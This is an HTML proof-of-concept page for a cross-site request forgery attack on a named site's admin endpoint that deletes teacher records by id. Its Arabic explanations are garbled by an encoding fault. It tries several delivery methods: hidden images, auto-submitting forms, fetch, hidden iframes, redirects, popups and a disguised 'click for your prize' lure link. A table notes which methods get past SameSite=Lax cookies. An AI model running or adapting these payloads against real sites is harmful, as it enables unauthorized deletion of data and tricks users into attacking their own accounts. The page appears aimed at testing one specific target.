<!doctype html>
<html dir="rtl" lang="ar">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CSRF Test - All Methods</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap"
      rel="stylesheet" />
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <h1>CSRF Attack Test โ All Methods</h1>
    <p class="subtitle">
      Target:
      https://imammuslim.systems/Admin/Teachers/Delete?id=1672d557-c952-4f0a-859c-567bfdccf6b9
    </p>

    <!-- Summary Table -->
    <div class="note">
      <strong>ููุด ูุง ุงุดุชุบูุ โ SameSite=Lax ุชุญูู ููุฐุง:</strong>
      <table>
        <tr>
          <th>ููุน ุงูุทูุจ</th>
          <th>SameSite=Lax</th>
          <th>SameSite=Strict</th>
          <th>SameSite=None</th>
        </tr>
        <tr>
          <td>ุฑุงุจุท ุนุงุฏู ูููุฑ ุนููู ุงููุณุชุฎุฏู (GET)</td>
          <td style="color: #51cf66">โ ุชูุฑุณูู</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #51cf66">โ ุชูุฑุณูู</td>
        </tr>
        <tr>
          <td>&lt;img src&gt; ุชููุงุฆู (GET)</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #51cf66">โ ุชูุฑุณูู</td>
        </tr>
        <tr>
          <td>&lt;form POST&gt; ุชููุงุฆู</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #51cf66">โ ุชูุฑุณูู</td>
        </tr>
        <tr>
          <td>fetch() / XMLHttpRequest</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #ffc107">โ๏ธ ุจุญุงุฌุฉ CORS</td>
        </tr>
        <tr>
          <td>&lt;iframe&gt; ุชููุงุฆู</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #51cf66">โ ุชูุฑุณูู</td>
        </tr>
        <tr>
          <td>window.open() ุซู submit</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #ff6b6b">โ ูุญุฌูุจุฉ</td>
          <td style="color: #51cf66">โ ุชูุฑุณูู</td>
        </tr>
      </table>
    </div>

    <!-- Hidden iframe target for forms -->
    <iframe
      name="hiddenFrame"
      style="width: 0; height: 0; border: 0; position: absolute"></iframe>

    <div class="grid">
      <!-- Method 1: IMG GET -->
      <!-- <div class="card">
        <span class="badge blocked">โ ูุญุฌูุจ โ SameSite=Lax</span>
        <h3>Method 1: &lt;img src&gt; โ GET ุชููุงุฆู</h3>
        <p class="desc">
          ุงูุจุฑุงูุฒุฑ ูุญููู ุงูุตูุฑุฉ ุชููุงุฆูุงู ุนูุฏ ูุชุญ ุงูุตูุญุฉ ููุฑุณู GET request.
          <br />ูุน SameSite=Lax ุงูููููุฒ <strong>ูุง ุชูุฑุณูู</strong> ูู ุทูุจุงุช
          ุงูุตูุฑ ูู domain ุขุฎุฑ.
        </p>
        <div class="status-box" id="s1">โณ ุฌุงุฑู ุงูุชูููุฐ ุงูุชููุงุฆู...</div>
        
        <img
          id="imgPayload"
          src="https://imammuslim.systems/Admin/Teachers/Delete?id=fa6de193-095e-4b14-843e-5fc17521006f"
          width="1"
          height="1"
          style="display: none"
          onload="
            document.getElementById('s1').innerHTML =
              '๐ค GET request ุฃูุฑุณูู โ ููู ุจุฏูู ููููุฒ (SameSite=Lax)'
          "
          onerror="
            document.getElementById('s1').innerHTML =
              '๐ค GET request ุฃูุฑุณูู โ ุจุฏูู ููููุฒ ุฃู ุฑูุถ ุงูุณูุฑูุฑ'
          " />
      </div> 

      <!-- Method 2: Form POST auto-submit -->
      <!-- <div class="card">
        <span class="badge blocked">โ ูุญุฌูุจ โ SameSite=Lax</span>
        <h3>Method 2: &lt;form POST&gt; โ auto-submit</h3>
        <p class="desc">
          ุงูุฌุงูุงุณูุฑูุจุช ูุนูู submit() ุชููุงุฆูุงู ุนูุฏ ุชุญููู ุงูุตูุญุฉ.
          <br />ูุน SameSite=Lax ุงูููููุฒ <strong>ูุง ุชูุฑุณูู</strong> ูู POST ูู
          domain ุฎุงุฑุฌู.
        </p>
        <div class="status-box" id="s2">โ ููุชุธุฑ...</div>
        <form
          id="formPost"
          action="https://imammuslim.systems/Admin/Teachers/Delete"
          method="POST"
          target="hiddenFrame"
          style="display: none">
          <input
            type="hidden"
            name="id"
            value="fa6de193-095e-4b14-843e-5fc17521006f" />
        </form>
        <button
          class="btn"
          onclick="
            document.getElementById('formPost').submit();
            document.getElementById('s2').innerHTML =
              '๐ค POST ุฃูุฑุณูู ุฅูู iframe โ ุจุฏูู ููููุฒ (SameSite=Lax)';
          ">
          ๐ ุชุฌุฑุจุฉ ูุฏููุฉ
        </button>
      </div> -->

      <!-- Method 3: Form GET auto-submit -->
      <div class="card">
        <span class="badge blocked">โ ูุญุฌูุจ โ SameSite=Lax</span>
        <h3>Method 3: &lt;form GET&gt; โ auto-submit</h3>
        <p class="desc">
          ููุณ ุงูููุฑุฉ ููู ุจู GET method ุนุจุฑ form.
          <br />ูุน SameSite=Lax ูุฐุง ุงูููุน ูุญุฌูุจ ูุฃูู navigation ุชููุงุฆู ุจุฏูู ุชุฏุฎู
          ุงููุณุชุฎุฏู.
        </p>
        <div class="status-box" id="s3">โ ููุชุธุฑ...</div>
        <form
          id="formGet"
          action="https://imammuslim.systems/Admin/Teachers/Delete"
          method="GET"
          target="hiddenFrame"
          style="display: none">
          <input
            type="hidden"
            name="id"
            value="fa6de193-095e-4b14-843e-5fc17521006f" />
        </form>
        <button
          class="btn"
          onclick="
            document.getElementById('formGet').submit();
            document.getElementById('s3').innerHTML =
              '๐ค GET form ุฃูุฑุณูู โ ุจุฏูู ููููุฒ (SameSite=Lax)';
          ">
          ๐ ุชุฌุฑุจุฉ ูุฏููุฉ
        </button>
      </div>

      <!-- Method 4: fetch() -->
      <!-- <div class="card">
        <span class="badge blocked">โ ูุญุฌูุจ โ CORS + SameSite</span>
        <h3>Method 4: fetch() / AJAX Request</h3>
        <p class="desc">
          ุฅุฑุณุงู ุทูุจ ุนุจุฑ JavaScript fetch API.
          <br />ูุญุฌูุจ ุจุณุจุจูู: SameSite=Lax ุชููุน ุงูููููุฒุ ูCORS ูููุน ูุฑุงุกุฉ ุงูุฑุฏ.
          ุงูุทูุจ ูุฏ ููุฑุณูู ููู ุจุฏูู credentials.
        </p>
        <div class="status-box" id="s4">โ ููุชุธุฑ...</div>
        <button
          class="btn"
          onclick="
            fetch(
              'https://imammuslim.systems/Admin/Teachers/Delete?id=fa6de193-095e-4b14-843e-5fc17521006f',
              {
                method: 'GET',
                credentials: 'include',
              },
            )
              .then(
                (r) =>
                  (document.getElementById('s4').innerHTML =
                    '๐ค fetch ุฃูุฑุณูู โ status: ' + r.status + ' (ุจุฏูู ููููุฒ)'),
              )
              .catch(
                (e) =>
                  (document.getElementById('s4').innerHTML =
                    '๐ซ ูุฑููุถ ุจู CORS: ' + e.message),
              )
          ">
          ๐ ุฅุฑุณุงู fetch
        </button>
      </div> -->

      <!-- Method 5: iframe -->
      <div class="card">
        <span class="badge blocked">โ ูุญุฌูุจ โ SameSite=Lax</span>
        <h3>Method 5: &lt;iframe src&gt; โ GET ุชููุงุฆู</h3>
        <p class="desc">
          ุชุญููู ุงูู URL ุงููุณุชูุฏู ุฏุงุฎู iframe ูุฎูู.
          <br />ูุน SameSite=Lax ุงูููููุฒ ูุง ุชูุฑุณููุ ูุงูู iframe ูุง ูุณุชุทูุน ูุฑุงุกุฉ
          ุงููุญุชูู (X-Frame-Options / CORS).
        </p>
        <div class="status-box" id="s5">โ ููุชุธุฑ...</div>
        <button
          class="btn"
          onclick="
            var f = document.createElement('iframe');
            f.src =
              'https://imammuslim.systems/Admin/Teachers/Delete?id=1672d557-c952-4f0a-859c-567bfdccf6b9';
            f.style.display = 'none';
            document.body.appendChild(f);
            document.getElementById('s5').innerHTML =
              '๐ค iframe ุฃููุดูุฆ ูุฃูุฑุณูู GET โ ุจุฏูู ููููุฒ (SameSite=Lax)';
          ">
          ๐ ุฅุทูุงู iframe
        </button>
      </div>

      <!-- Method 6: Top-level Navigation (ONLY method that works with Lax) -->
      <div class="card">
        <span class="badge works"
          >โ ูุนูู ูุน SameSite=Lax โ ุฅุฐุง ููุฑ ุงููุณุชุฎุฏู</span
        >
        <h3>Method 6: ุฑุงุจุท ุนุงุฏู โ Top-Level Navigation</h3>
        <p class="desc">
          <strong>ุงููุญูุฏ ุงูุฐู ูุนูู ูุน SameSite=Lax!</strong>
          <br />ุฅุฐุง ููุฑ ุงููุณุชุฎุฏู ุนูู ุฑุงุจุทุ ูุฐุง ููุนุฏู top-level navigation
          ูุงูููููุฒ ุชูุฑุณูู. <br />ุงูุฎุฏุนุฉ: ุฅุฎูุงุก ุงูุฑุงุจุท ุงูุญูููู ุจูุต ุจุฑูุก.
        </p>
        <div class="status-box" id="s6">โ ูู ุงูุชุธุงุฑ ููุฑ ุงููุณุชุฎุฏู...</div>
        <a
          class="btn"
          href="https://imammuslim.systems/Admin/Teachers/Delete?id=fa6de193-095e-4b14-843e-5fc17521006f"
          target="_blank"
          onclick="
            document.getElementById('s6').innerHTML =
              '๐ฑ๏ธ ุงููุณุชุฎุฏู ููุฑ โ GET ูุน ุงูููููุฒ โ'
          ">
          ๐ ุงุถุบุท ููุง ูุฌุงุฆุฒุชู!
        </a>
      </div>

      <!-- Method 7: window.location redirect -->
      <div class="card">
        <span class="badge works">โ ูุนูู ูุน SameSite=Lax</span>
        <h3>Method 7: window.location Redirect</h3>
        <p class="desc">
          ุชุญููู ุงูุตูุญุฉ ุงูุญุงููุฉ ูุจุงุดุฑุฉ ุฅูู ุงูู URL ุงููุณุชูุฏู.
          <br />ูุฐุง top-level navigation โ ุงูููููุฒ ุชูุฑุณูู ูุน SameSite=Lax.
          <br />โ๏ธ ุงูุถุญูุฉ ุณูุฑู ุงูู URL ูู ุดุฑูุท ุงูุนููุงู.
        </p>
        <div class="status-box" id="s7">โ ููุชุธุฑ...</div>
        <button
          class="btn"
          onclick="
            document.getElementById('s7').innerHTML =
              '๐ ุฌุงุฑู ุงูุชุญููู... ุงูููููุฒ ุณุชูุฑุณูู!';
            setTimeout(function () {
              window.location.href =
                'https://imammuslim.systems/Admin/Teachers/Delete?id=1672d557-c952-4f0a-859c-567bfdccf6b9';
            }, 1000);
          ">
          โ๏ธ ุชุฌุฑุจุฉ Redirect
        </button>
      </div>

      <!-- Method 8: window.open -->
      <div class="card">
        <span class="badge depends">โ๏ธ ูุนูู โ ููู ูุฏ ููุญุฌูุจ ูู Popup</span>
        <h3>Method 8: window.open()</h3>
        <p class="desc">
          ูุชุญ ูุงูุฐุฉ ุฌุฏูุฏุฉ ููู URL ุงููุณุชูุฏู.
          <br />ููุนุฏู top-level navigation โ ุงูููููุฒ ุชูุฑุณูู. <br />โ๏ธ ุงูุจุฑุงูุฒุฑ
          ูุฏ ูุญุฌุจ ุงูู popup ุฅุฐุง ูู ููู ุจุณุจุจ ููุฑ ูุณุชุฎุฏู.
        </p>
        <div class="status-box" id="s8">โ ููุชุธุฑ...</div>
        <button
          class="btn"
          onclick="
            var w = window.open(
              'https://imammuslim.systems/Admin/Teachers/Delete?id=38602b01-89c7-4ecd-867c-ec7172a42e58',
              'csrfPopup',
              'width=600,height=400,top=200,left=300,toolbar=no,menubar=no,scrollbars=yes,resizable=yes',
            );
            if (w) {
              document.getElementById('s8').innerHTML =
                '๐ช Popup ููุชูุญ โ GET ูุน ุงูููููุฒ ุฃูุฑุณูู โ';
            } else {
              document.getElementById('s8').innerHTML =
                '๐ซ Popup ูุญุฌูุจ ูู ุงูุจุฑุงูุฒุฑ';
            }
          ">
          ๐ window.open
        </button>
      </div>
    </div>

    <!-- Hidden iframe target for forms: placed BEFORE forms submit to it -->

    <script>
      // Methods 1 & 2 are commented out โ nothing to auto-run
      window.onload = function () {};
    </script>
  </body>
</html>
